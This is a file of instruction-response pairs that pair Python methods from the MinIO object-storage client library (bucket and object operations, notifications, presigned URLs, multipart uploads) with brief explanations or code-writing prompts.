{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef make_bucket(self, bucket_name, location='us-east-1'):\n        is_valid_bucket_name(bucket_name)\n\n        # Default region for all requests.\n        region = 'us-east-1'\n        if self._region:\n            region = self._region\n            # Validate if caller requested bucket location is same as current region\n            if self._region != location:\n                raise InvalidArgumentError(\"Configured region {0}, requested\"\n                                           \" {1}\".format(self._region,\n                                                         location))\n\n        method = 'PUT'\n        # Set user agent once before the request.\n        headers = {'User-Agent': self._user_agent}\n\n        content = None\n        if location and location != 'us-east-1':\n            content = xml_marshal_bucket_constraint(location)\n            headers['Content-Length'] = str(len(content))\n\n        content_sha256_hex = get_sha256_hexdigest(content)\n        if content:\n            headers['Content-Md5'] = get_md5_base64digest(content)\n\n        # In case of Amazon S3.  The make bucket issued on already\n        # existing bucket would fail with 'AuthorizationMalformed'\n        # error if virtual style is used. So we default to 'path\n        # style' as that is the preferred method here. The final\n        # location of the 'bucket' is provided through XML\n        # LocationConstraint data with the request.\n        # Construct target url.\n        url = self._endpoint_url + '/' + bucket_name + '/'\n\n        # Get signature headers if any.\n        headers = sign_v4(method, url, region,\n                          headers, self._access_key,\n                          self._secret_key,\n                          self._session_token,\n                          content_sha256_hex)\n\n        response = self._http.urlopen(method, url,\n                                      body=content,\n                                      headers=headers)\n\n        if response.status != 200:\n            raise ResponseError(response, method, bucket_name).get_exception()\n\n        self._set_bucket_region(bucket_name, region=location)", "response": "Make a new bucket on the server."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list_buckets(self):\n\n        method = 'GET'\n        url = get_target_url(self._endpoint_url)\n        # Set user agent once before the request.\n        headers = {'User-Agent': self._user_agent}\n\n        # default for all requests.\n        region = 'us-east-1'\n        # region is set then use the region.\n        if self._region:\n            region = self._region\n\n        # Get signature headers if any.\n        headers = sign_v4(method, url, region,\n                          headers, self._access_key,\n                          self._secret_key,\n                          self._session_token,\n                          None)\n\n        response = self._http.urlopen(method, url,\n                                      body=None,\n                                      headers=headers)\n\n        if self._trace_output_stream:\n            dump_http(method, url, headers, response,\n                      self._trace_output_stream)\n\n        if response.status != 200:\n            raise ResponseError(response, method).get_exception()\n        try:\n            return parse_list_buckets(response.data)\n        except InvalidXMLError:\n            if self._endpoint_url.endswith(\"s3.amazonaws.com\") and (not self._access_key or not self._secret_key):\n                raise AccessDenied(response)", "response": "List all buckets owned by the current user."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking if the bucket exists and if the user has access to it.", "response": "def bucket_exists(self, bucket_name):\n        \"\"\"\n        Check if the bucket exists and if the user has access to it.\n\n        :param bucket_name: To test the existence and user access.\n        :return: True on success.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n\n        try:\n            self._url_open('HEAD', bucket_name=bucket_name)\n        # If the bucket has not been created yet, MinIO will return a \"NoSuchBucket\" error.\n        except NoSuchBucket:\n            return False\n        except ResponseError:\n            raise\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nremoves a bucket from the cache.", "response": "def remove_bucket(self, bucket_name):\n        \"\"\"\n        Remove a bucket.\n\n        :param bucket_name: Bucket to remove\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        self._url_open('DELETE', bucket_name=bucket_name)\n\n        # Make sure to purge bucket_name from region cache.\n        self._delete_bucket_region(bucket_name)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_bucket_policy(self, bucket_name):\n        is_valid_bucket_name(bucket_name)\n\n        response = self._url_open(\"GET\",\n                                  bucket_name=bucket_name,\n                                  query={\"policy\": \"\"})\n        return response.data", "response": "Get bucket policy of given bucket name."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset the access policy of given bucket name.", "response": "def set_bucket_policy(self, bucket_name, policy):\n        \"\"\"\n        Set bucket policy of given bucket name.\n\n        :param bucket_name: Bucket name.\n        :param policy: Access policy/ies in string format.\n        \"\"\"\n        is_valid_policy_type(policy)\n\n        is_valid_bucket_name(bucket_name)\n\n        headers = {\n            'Content-Length': str(len(policy)),\n            'Content-Md5': get_md5_base64digest(policy)\n        }\n        content_sha256_hex = get_sha256_hexdigest(policy)\n        self._url_open(\"PUT\",\n                        bucket_name=bucket_name,\n                        query={\"policy\": \"\"},\n                        headers=headers,\n                        body=policy,\n                        content_sha256=content_sha256_hex)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_bucket_notification(self, bucket_name):\n        is_valid_bucket_name(bucket_name)\n\n        response = self._url_open(\n            \"GET\",\n            bucket_name=bucket_name,\n            query={\"notification\": \"\"},\n        )\n        data = response.data.decode('utf-8')\n        return parse_get_bucket_notification(data)", "response": "Get the notifications configured for the given bucket."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_bucket_notification(self, bucket_name, notifications):\n        is_valid_bucket_name(bucket_name)\n        is_valid_bucket_notification_config(notifications)\n\n        content = xml_marshal_bucket_notifications(notifications)\n        headers = {\n            'Content-Length': str(len(content)),\n            'Content-Md5': get_md5_base64digest(content)\n        }\n        content_sha256_hex = get_sha256_hexdigest(content)\n        self._url_open(\n            'PUT',\n            bucket_name=bucket_name,\n            query={\"notification\": \"\"},\n            headers=headers,\n            body=content,\n            content_sha256=content_sha256_hex\n        )", "response": "Set the given notifications on the given bucket."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove_all_bucket_notification(self, bucket_name):\n        is_valid_bucket_name(bucket_name)\n\n        content_bytes = xml_marshal_bucket_notifications({})\n        headers = {\n            'Content-Length': str(len(content_bytes)),\n            'Content-Md5': get_md5_base64digest(content_bytes)\n        }\n        content_sha256_hex = get_sha256_hexdigest(content_bytes)\n        self._url_open(\n            'PUT',\n            bucket_name=bucket_name,\n            query={\"notification\": \"\"},\n            headers=headers,\n            body=content_bytes,\n            content_sha256=content_sha256_hex\n        )", "response": "Removes all bucket notification configurations configured for the given bucket."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\niterates over all events that have been added to a bucket.", "response": "def listen_bucket_notification(self, bucket_name, prefix='', suffix='',\n                                   events=['s3:ObjectCreated:*',\n                                           's3:ObjectRemoved:*',\n                                           's3:ObjectAccessed:*']):\n        \"\"\"\n        Yeilds new event notifications on a bucket, caller should iterate\n        to read new notifications.\n\n        NOTE: Notification is retried in case of `JSONDecodeError` otherwise\n        the function raises an exception.\n\n        :param bucket_name: Bucket name to listen event notifications from.\n        :param prefix: Object key prefix to filter notifications for.\n        :param suffix: Object key suffix to filter notifications for.\n        :param events: Enables notifications for specific event types.\n             of events.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n\n        # If someone explicitly set prefix to None convert it to empty string.\n        if prefix is None:\n            prefix = ''\n\n        # If someone explicitly set suffix to None convert it to empty string.\n        if suffix is None:\n            suffix = ''\n\n        url_components = urlsplit(self._endpoint_url)\n        if url_components.hostname == 's3.amazonaws.com':\n            raise InvalidArgumentError(\n                'Listening for event notifications on a bucket is a MinIO '\n                'specific extension to bucket notification API. It is not '\n                'supported by Amazon S3')\n\n        query = {\n            'prefix': prefix,\n            'suffix': suffix,\n            'events': events,\n        }\n        while True:\n            response = self._url_open('GET', bucket_name=bucket_name,\n                                      query=query, preload_content=False)\n            try:\n                for line in response.stream():\n                    if line.strip():\n                        if hasattr(line, 'decode'):\n                            line = line.decode('utf-8')\n                        event = json.loads(line)\n                        if event['Records'] is not None:\n                            yield event\n            except JSONDecodeError:\n                response.close()\n                continue"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nupload a new object to the cloud storage server.", "response": "def fput_object(self, bucket_name, object_name, file_path,\n                    content_type='application/octet-stream',\n                    metadata=None, sse=None, progress=None,\n                    part_size=DEFAULT_PART_SIZE):\n        \"\"\"\n        Add a new object to the cloud storage server.\n\n        Examples:\n            minio.fput_object('foo', 'bar', 'filepath', 'text/plain')\n\n        :param bucket_name: Bucket to read object from.\n        :param object_name: Name of the object to read.\n        :param file_path: Local file path to be uploaded.\n        :param content_type: Content type of the object.\n        :param metadata: Any additional metadata to be uploaded along\n            with your PUT request.\n        :param progress: A progress object\n        :param part_size: Multipart part size\n        :return: etag\n        \"\"\"\n\n        # Open file in 'read' mode.\n        with open(file_path, 'rb') as file_data:\n            file_size = os.stat(file_path).st_size\n            return self.put_object(bucket_name, object_name, file_data,\n                                   file_size, content_type, metadata, sse,\n                                   progress, part_size)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nretrieve an object from a bucket and writes at file_path. Examples: minio.fget_object('foo', 'bar', 'localfile') :param bucket_name: Bucket to read object from. :param object_name: Name of the object to read. :param file_path: Local file path to save the object. :param request_headers: Any additional headers to be added with GET request.", "response": "def fget_object(self, bucket_name, object_name, file_path, request_headers=None, sse=None):\n        \"\"\"\n        Retrieves an object from a bucket and writes at file_path.\n\n        Examples:\n            minio.fget_object('foo', 'bar', 'localfile')\n\n        :param bucket_name: Bucket to read object from.\n        :param object_name: Name of the object to read.\n        :param file_path: Local file path to save the object.\n        :param request_headers: Any additional headers to be added with GET request.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        stat = self.stat_object(bucket_name, object_name, sse)\n\n        if os.path.isdir(file_path):\n            raise OSError(\"file is a directory.\")\n\n        # Create top level directory if needed.\n        top_level_dir = os.path.dirname(file_path)\n        if top_level_dir:\n            mkdir_p(top_level_dir)\n\n        # Write to a temporary file \"file_path.part.minio\" before saving.\n        file_part_path = file_path + stat.etag + '.part.minio'\n\n        # Open file in 'write+append' mode.\n        with open(file_part_path, 'ab') as file_part_data:\n            # Save current file_part statinfo.\n            file_statinfo = os.stat(file_part_path)\n\n            # Get partial object.\n            response = self._get_partial_object(bucket_name, object_name,\n                                                offset=file_statinfo.st_size,\n                                                length=0,\n                                                request_headers=request_headers,\n                                                sse=sse)\n\n            # Save content_size to verify if we wrote more data.\n            content_size = int(response.headers['content-length'])\n\n            # Save total_written.\n            total_written = 0\n            for data in response.stream(amt=1024 * 1024):\n                file_part_data.write(data)\n                total_written += len(data)\n\n            # Release the connection from the response at this point.\n            response.release_conn()\n\n            # Verify if we wrote data properly.\n            if total_written < content_size:\n                msg = 'Data written {0} bytes is smaller than the' \\\n                      'specified size {1} bytes'.format(total_written,\n                                                        content_size)\n                raise InvalidSizeError(msg)\n\n            if total_written > content_size:\n                msg = 'Data written {0} bytes is in excess than the' \\\n                      'specified size {1} bytes'.format(total_written,\n                                                        content_size)\n                raise InvalidSizeError(msg)\n\n        #Delete existing file to be compatible with Windows\n        if os.path.exists(file_path):\n               os.remove(file_path)\n        #Rename with destination file path\n        os.rename(file_part_path, file_path)\n\n        # Return the stat\n        return stat"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_object(self, bucket_name, object_name, request_headers=None, sse=None):\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        return self._get_partial_object(bucket_name,\n                                        object_name,\n                                        request_headers=request_headers,\n                                        sse=sse)", "response": "This function returns an object from a bucket."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_partial_object(self, bucket_name, object_name, offset=0, length=0, request_headers=None, sse=None):\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        return self._get_partial_object(bucket_name,\n                                        object_name,\n                                        offset, length,\n                                        request_headers=request_headers,\n                                        sse=sse)", "response": "This is a convenience method that returns an object that contains an open network connection and is used to manage incremental consumption of the object."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef copy_object(self, bucket_name, object_name, object_source,\n                    conditions=None, source_sse=None, sse=None, metadata=None):\n        \"\"\"\n        Copy a source object on object storage server to a new object.\n\n        NOTE: Maximum object size supported by this API is 5GB.\n\n        Examples:\n\n        :param bucket_name: Bucket of new object.\n        :param object_name: Name of new object.\n        :param object_source: Source object to be copied.\n        :param conditions: :class:`CopyConditions` object. Collection of\n        supported CopyObject conditions.\n        :param metadata: Any user-defined metadata to be copied along with\n        destination object.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n        is_non_empty_string(object_source)\n\n        headers = {}\n\n        # Preserving the user-defined metadata in headers\n        if metadata is not None:\n            headers = amzprefix_user_metadata(metadata)\n            headers[\"x-amz-metadata-directive\"] = \"REPLACE\"\n\n        if conditions:\n            for k, v in conditions.items():\n                headers[k] = v\n\n        # Source argument to copy_object can only be of type copy_SSE_C\n        if source_sse:\n            is_valid_source_sse_object(source_sse)\n            headers.update(source_sse.marshal())\n\n        #Destination argument to copy_object cannot be of type copy_SSE_C\n        if sse:\n            is_valid_sse_object(sse)\n            headers.update(sse.marshal())\n\n        headers['X-Amz-Copy-Source'] = queryencode(object_source)\n        response = self._url_open('PUT',\n                                  bucket_name=bucket_name,\n                                  object_name=object_name,\n                                  headers=headers)\n\n        return parse_copy_object(bucket_name, object_name, response.data)", "response": "Copy an object from one bucket to another."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef put_object(self, bucket_name, object_name, data, length,\n                   content_type='application/octet-stream',\n                   metadata=None, sse=None, progress=None,\n                   part_size=DEFAULT_PART_SIZE):\n        \"\"\"\n        Add a new object to the cloud storage server.\n\n        NOTE: Maximum object size supported by this API is 5TiB.\n\n        Examples:\n         file_stat = os.stat('hello.txt')\n         with open('hello.txt', 'rb') as data:\n             minio.put_object('foo', 'bar', data, file_stat.st_size, 'text/plain')\n\n        - For length lesser than 5MB put_object automatically\n          does single Put operation.\n        - For length larger than 5MB put_object automatically\n          does resumable multipart operation.\n\n        :param bucket_name: Bucket of new object.\n        :param object_name: Name of new object.\n        :param data: Contents to upload.\n        :param length: Total length of object.\n        :param content_type: mime type of object as a string.\n        :param metadata: Any additional metadata to be uploaded along\n            with your PUT request.\n        :param progress: A progress object\n        :param part_size: Multipart part size\n        :return: etag\n        \"\"\"\n\n        is_valid_sse_object(sse)\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        if progress:\n            if not isinstance(progress, Thread):\n                raise TypeError('Progress object should inherit the thread.')\n            # Set progress bar length and object name before upload\n            progress.set_meta(total_length=length, object_name=object_name)\n\n        if not callable(getattr(data, 'read')):\n            raise ValueError(\n                'Invalid input data does not implement a callable read() method')\n\n        if length > (part_size * MAX_MULTIPART_COUNT):\n            raise InvalidArgumentError('Part size * max_parts(10000) is '\n                                       ' lesser than input length.')\n\n        if part_size < MIN_PART_SIZE:\n            raise InvalidArgumentError('Input part size is smaller '\n                                       ' than allowed minimum of 5MiB.')\n\n        if part_size > MAX_PART_SIZE:\n            raise InvalidArgumentError('Input part size is bigger '\n                                       ' than allowed maximum of 5GiB.')\n\n        if not metadata:\n            metadata = {}\n\n        metadata = amzprefix_user_metadata(metadata)\n\n        metadata['Content-Type'] = 'application/octet-stream' if \\\n            not content_type else content_type\n\n        if length > part_size:\n            return self._stream_put_object(bucket_name, object_name,\n                                           data, length, metadata=metadata,\n                                           sse=sse, progress=progress,\n                                           part_size=part_size)\n\n        current_data = data.read(length)\n        if len(current_data) != length:\n            raise InvalidArgumentError(\n                'Could not read {} bytes from data to upload'.format(length)\n            )\n\n        return self._do_put_object(bucket_name, object_name,\n                                   current_data, len(current_data),\n                                   metadata=metadata, sse=sse,\n                                   progress=progress)", "response": "This method uploads an object to the cloud storage server."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_objects(self, bucket_name, prefix='', recursive=False):\n        is_valid_bucket_name(bucket_name)\n\n        # If someone explicitly set prefix to None convert it to empty string.\n        if prefix is None:\n            prefix = ''\n\n        method = 'GET'\n\n        # Initialize query parameters.\n        query = {\n            'max-keys': '1000',\n            'prefix': prefix\n        }\n\n        # Delimited by default.\n        if not recursive:\n            query['delimiter'] = '/'\n\n        marker = ''\n        is_truncated = True\n        while is_truncated:\n            if marker:\n                query['marker'] = marker\n            headers = {}\n            response = self._url_open(method,\n                                      bucket_name=bucket_name,\n                                      query=query,\n                                      headers=headers)\n            objects, is_truncated, marker = parse_list_objects(response.data,\n                                                               bucket_name=bucket_name)\n            for obj in objects:\n                yield obj", "response": "List objects in the given bucket."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list_objects_v2(self, bucket_name, prefix='', recursive=False):\n        is_valid_bucket_name(bucket_name)\n\n        # If someone explicitly set prefix to None convert it to empty string.\n        if prefix is None:\n            prefix = ''\n\n        # Initialize query parameters.\n        query = {\n            'list-type': '2',\n            'prefix': prefix\n        }\n\n        # Delimited by default.\n        if not recursive:\n            query['delimiter'] = '/'\n\n        continuation_token = None\n        is_truncated = True\n        while is_truncated:\n            if continuation_token is not None:\n                query['continuation-token'] = continuation_token\n            response = self._url_open(method='GET',\n                                      bucket_name=bucket_name,\n                                      query=query)\n            objects, is_truncated, continuation_token = parse_list_objects_v2(\n                response.data, bucket_name=bucket_name\n            )\n\n            for obj in objects:\n                yield obj", "response": "List objects in the given bucket using the List objects V2 API."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks if an object exists.", "response": "def stat_object(self, bucket_name, object_name, sse=None):\n        \"\"\"\n        Check if an object exists.\n\n        :param bucket_name: Bucket of object.\n        :param object_name: Name of object\n        :return: Object metadata if object exists\n        \"\"\"\n\n        headers = {}\n        if sse:\n            is_valid_sse_c_object(sse=sse)\n            headers.update(sse.marshal())\n\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        response = self._url_open('HEAD', bucket_name=bucket_name,\n                                  object_name=object_name, headers=headers)\n\n        etag = response.headers.get('etag', '').replace('\"', '')\n        size = int(response.headers.get('content-length', '0'))\n        content_type = response.headers.get('content-type', '')\n        last_modified = response.headers.get('last-modified')\n\n        ## Capture only custom metadata.\n        custom_metadata = dict()\n        for k in response.headers:\n            if is_supported_header(k) or is_amz_header(k):\n                custom_metadata[k] = response.headers.get(k)\n\n        if last_modified:\n            last_modified = dateutil.parser.parse(last_modified).timetuple()\n        return Object(bucket_name, object_name, last_modified, etag, size,\n                      content_type=content_type, metadata=custom_metadata)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef remove_object(self, bucket_name, object_name):\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        # No reason to store successful response, for errors\n        # relevant exceptions are thrown.\n        self._url_open('DELETE', bucket_name=bucket_name,\n                       object_name=object_name)", "response": "Remove an object from the bucket."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _process_remove_objects_batch(self, bucket_name, objects_batch):\n        # assemble request content for objects_batch\n        content = xml_marshal_delete_objects(objects_batch)\n\n        # compute headers\n        headers = {\n            'Content-Md5': get_md5_base64digest(content),\n            'Content-Length': len(content)\n        }\n        query = {'delete': ''}\n        content_sha256_hex = get_sha256_hexdigest(content)\n\n        # send multi-object delete request\n        response = self._url_open(\n            'POST', bucket_name=bucket_name,\n            headers=headers, body=content,\n            query=query, content_sha256=content_sha256_hex,\n        )\n\n        # parse response to find delete errors\n        return parse_multi_object_delete_response(response.data)", "response": "Requester and response parser for remove_objects_batch"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove_objects(self, bucket_name, objects_iter):\n        is_valid_bucket_name(bucket_name)\n        if isinstance(objects_iter, basestring):\n            raise TypeError(\n                'objects_iter cannot be `str` or `bytes` instance. It must be '\n                'a list, tuple or iterator of object names'\n            )\n\n        # turn list like objects into an iterator.\n        objects_iter = itertools.chain(objects_iter)\n\n        obj_batch = []\n        exit_loop = False\n        while not exit_loop:\n            try:\n                object_name = next(objects_iter)\n                is_non_empty_string(object_name)\n            except StopIteration:\n                exit_loop = True\n\n            if not exit_loop:\n                obj_batch.append(object_name)\n\n            # if we have 1000 items in the batch, or we have to exit\n            # the loop, we have to make a request to delete objects.\n            if len(obj_batch) == 1000 or (exit_loop and len(obj_batch) > 0):\n                # send request and parse response\n                errs_result = self._process_remove_objects_batch(\n                    bucket_name, obj_batch\n                )\n\n                # return the delete errors.\n                for err_result in errs_result:\n                    yield err_result\n\n                # clear batch for next set of items\n                obj_batch = []", "response": "Removes multiple objects from a bucket."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef list_incomplete_uploads(self, bucket_name, prefix='',\n                                recursive=False):\n        \"\"\"\n        List all in-complete uploads for a given bucket.\n\n        Examples:\n            incomplete_uploads = minio.list_incomplete_uploads('foo')\n            for current_upload in incomplete_uploads:\n                print(current_upload)\n            # hello\n            # hello/\n            # hello/\n            # world/\n\n            incomplete_uploads = minio.list_incomplete_uploads('foo',\n                                                               prefix='hello/')\n            for current_upload in incomplete_uploads:\n                print(current_upload)\n            # hello/world/\n\n            incomplete_uploads = minio.list_incomplete_uploads('foo',\n                                                               recursive=True)\n            for current_upload in incomplete_uploads:\n                print(current_upload)\n            # hello/world/1\n            # world/world/2\n            # ...\n\n            incomplete_uploads = minio.list_incomplete_uploads('foo',\n                                                               prefix='hello/',\n                                                               recursive=True)\n            for current_upload in incomplete_uploads:\n                print(current_upload)\n            # hello/world/1\n            # hello/world/2\n\n        :param bucket_name: Bucket to list incomplete uploads\n        :param prefix: String specifying objects returned must begin with.\n        :param recursive: If yes, returns all incomplete uploads for\n           a specified prefix.\n        :return: An generator of incomplete uploads in alphabetical order.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n\n        return self._list_incomplete_uploads(bucket_name, prefix, recursive)", "response": "List all in - complete uploads for a given bucket."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nlisting all incomplete multipart objects in a bucket.", "response": "def _list_incomplete_uploads(self, bucket_name, prefix='',\n                                 recursive=False, is_aggregate_size=True):\n        \"\"\"\n        List incomplete uploads list all previously uploaded incomplete multipart objects.\n\n        :param bucket_name: Bucket name to list uploaded objects.\n        :param prefix: String specifying objects returned must begin with.\n        :param recursive: If yes, returns all incomplete objects for a specified prefix.\n        :return: An generator of incomplete uploads in alphabetical order.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n\n        # If someone explicitly set prefix to None convert it to empty string.\n        if prefix is None:\n            prefix = ''\n\n        # Initialize query parameters.\n        query = {\n            'uploads': '',\n            'max-uploads': '1000',\n            'prefix': prefix\n        }\n\n        if not recursive:\n            query['delimiter'] = '/'\n\n        key_marker, upload_id_marker = '', ''\n        is_truncated = True\n        while is_truncated:\n            if key_marker:\n                query['key-marker'] = key_marker\n            if upload_id_marker:\n                query['upload-id-marker'] = upload_id_marker\n\n            response = self._url_open('GET',\n                                      bucket_name=bucket_name,\n                                      query=query)\n            (uploads, is_truncated, key_marker,\n             upload_id_marker) = parse_list_multipart_uploads(response.data,\n                                                              bucket_name)\n            for upload in uploads:\n                if is_aggregate_size:\n                    upload.size = self._get_total_multipart_upload_size(\n                        upload.bucket_name,\n                        upload.object_name,\n                        upload.upload_id)\n                yield upload"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_total_multipart_upload_size(self, bucket_name, object_name,\n                                         upload_id):\n        \"\"\"\n        Get total multipart upload size.\n\n        :param bucket_name: Bucket name to list parts for.\n        :param object_name: Object name to list parts for.\n        :param upload_id: Upload id of the previously uploaded object name.\n        \"\"\"\n        return sum(\n            [part.size for part in\n             self._list_object_parts(bucket_name, object_name, upload_id)]\n        )", "response": "Get total multipart upload size."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _list_object_parts(self, bucket_name, object_name, upload_id):\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n        is_non_empty_string(upload_id)\n\n        query = {\n            'uploadId': upload_id,\n            'max-parts': '1000'\n        }\n\n        is_truncated = True\n        part_number_marker = ''\n        while is_truncated:\n            if part_number_marker:\n                query['part-number-marker'] = str(part_number_marker)\n\n            response = self._url_open('GET',\n                                      bucket_name=bucket_name,\n                                      object_name=object_name,\n                                      query=query)\n\n            parts, is_truncated, part_number_marker = parse_list_parts(\n                response.data,\n                bucket_name=bucket_name,\n                object_name=object_name,\n                upload_id=upload_id\n            )\n            for part in parts:\n                yield part", "response": "List all parts for an object."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves all in - complete uploads for a given object.", "response": "def remove_incomplete_upload(self, bucket_name, object_name):\n        \"\"\"\n        Remove all in-complete uploads for a given bucket_name and object_name.\n\n        :param bucket_name: Bucket to drop incomplete uploads\n        :param object_name: Name of object to remove incomplete uploads\n        :return: None\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        recursive = True\n        uploads = self._list_incomplete_uploads(bucket_name, object_name,\n                                                recursive,\n                                                is_aggregate_size=False)\n        for upload in uploads:\n            if object_name == upload.object_name:\n                self._remove_incomplete_upload(bucket_name, object_name,\n                                               upload.upload_id)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a url that is used to presign a method on an object.", "response": "def presigned_url(self, method,\n                    bucket_name,\n                    object_name,\n                    expires=timedelta(days=7),\n                    response_headers=None,\n                    request_date=None):\n        \"\"\"\n        Presigns a method on an object and provides a url\n\n        Example:\n            from datetime import timedelta\n\n            presignedURL = presigned_url('GET',\n                                         'bucket_name',\n                                         'object_name',\n                                         expires=timedelta(days=7))\n            print(presignedURL)\n\n        :param bucket_name: Bucket for the presigned url.\n        :param object_name: Object for which presigned url is generated.\n        :param expires: Optional expires argument to specify timedelta.\n                        Defaults to 7days.\n        :params response_headers: Optional response_headers argument to\n                                  specify response fields like date, size,\n                                  type of file, data about server, etc.\n        :params request_date: Optional request_date argument to\n                              specify a different request date. Default is\n                              current date.\n        :return: Presigned put object url.\n        \"\"\"\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        if expires.total_seconds() < 1 or \\\n           expires.total_seconds() > _MAX_EXPIRY_TIME:\n            raise InvalidArgumentError('Expires param valid values'\n                                       ' are between 1 sec to'\n                                       ' {0} secs'.format(_MAX_EXPIRY_TIME))\n\n        region = self._get_bucket_region(bucket_name)\n        url = get_target_url(self._endpoint_url,\n                             bucket_name=bucket_name,\n                             object_name=object_name,\n                             bucket_region=region)\n\n        return presign_v4(method, url,\n                          self._access_key,\n                          self._secret_key,\n                          session_token=self._session_token,\n                          region=region,\n                          expires=int(expires.total_seconds()),\n                          response_headers=response_headers,\n                          request_date=request_date)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef presigned_post_policy(self, post_policy):\n        post_policy.is_valid()\n\n        date = datetime.utcnow()\n        iso8601_date = date.strftime(\"%Y%m%dT%H%M%SZ\")\n        region = self._get_bucket_region(post_policy.form_data['bucket'])\n        credential_string = generate_credential_string(self._access_key,\n                                                       date, region)\n\n        policy = [\n            ('eq', '$x-amz-date', iso8601_date),\n            ('eq', '$x-amz-algorithm', _SIGN_V4_ALGORITHM),\n            ('eq', '$x-amz-credential', credential_string),\n        ]\n        if self._session_token:\n            policy.add(('eq', '$x-amz-security-token', self._session_token))\n\n        post_policy_base64 = post_policy.base64(extras=policy)\n        signature = post_presign_signature(date, region,\n                                           self._secret_key,\n                                           post_policy_base64)\n        form_data = {\n            'policy': post_policy_base64,\n            'x-amz-algorithm': _SIGN_V4_ALGORITHM,\n            'x-amz-credential': credential_string,\n            'x-amz-date': iso8601_date,\n            'x-amz-signature': signature,\n        }\n        if self._session_token:\n            form_data['x-amz-security-token'] = self._session_token\n\n        post_policy.form_data.update(form_data)\n        url_str = get_target_url(self._endpoint_url,\n                                 bucket_name=post_policy.form_data['bucket'],\n                                 bucket_region=region)\n        return (url_str, post_policy.form_data)", "response": "Returns a dictionary that can be used in curl or HTML forms."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_partial_object(self, bucket_name, object_name,\n                            offset=0, length=0, request_headers=None, sse=None):\n        \"\"\"Retrieves an object from a bucket.\n\n        Optionally takes an offset and length of data to retrieve.\n\n        It returns a response object whose content is not\n        pre-loaded. This means that the connection associated with the\n        response needs to be released (for efficient re-use) after\n        usage with `response.release_conn()`. Otherwise, the\n        connection will linger until the object is garbage collected,\n        when the connection is simply closed and not re-used.\n\n        Examples:\n            partial_object = minio.get_partial_object('foo', 'bar', 2, 4)\n\n        :param bucket_name: Bucket to retrieve object from\n        :param object_name: Name of object to retrieve\n        :param offset: Optional offset to retrieve bytes from.\n           Must be >= 0.\n        :param length: Optional number of bytes to retrieve.\n           Must be > 0.\n        :param request_headers: Any additional metadata to be uploaded along\n            with request.\n        :return: :class:`urllib3.response.HTTPResponse` object.\n\n        \"\"\"\n        is_valid_sse_c_object(sse=sse)\n        is_valid_bucket_name(bucket_name)\n        is_non_empty_string(object_name)\n\n        headers = {}\n        if request_headers:\n            headers = request_headers\n\n        if offset != 0 or length != 0:\n            request_range = '{}-{}'.format(\n                offset, \"\" if length == 0 else offset + length - 1\n            )\n            headers['Range'] = 'bytes=' + request_range\n\n        if sse:\n            headers.update(sse.marshal())\n\n        return self._url_open('GET',\n                               bucket_name=bucket_name,\n                               object_name=object_name,\n                               headers=headers,\n                               preload_content=False)", "response": "Retrieves an object from a bucket."}
